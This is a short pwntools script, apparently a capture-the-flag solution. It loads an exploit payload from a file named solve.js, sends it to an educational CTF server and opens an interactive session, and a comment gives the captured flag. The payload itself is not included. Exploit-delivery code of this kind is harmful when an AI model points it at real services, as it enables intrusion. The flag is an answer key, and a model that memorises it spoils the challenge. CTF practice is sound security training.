from pwn import *

with open("solve.js", "rb") as f:
    payload = f.read()

io = remote("edu-ctf.zoolab.org", 30219)
io.sendlineafter(b"len> ", str(len(payload)).encode())
io.send(payload)
io.interactive()

# FLAG{nlnlOUO_nlnlSoFun}
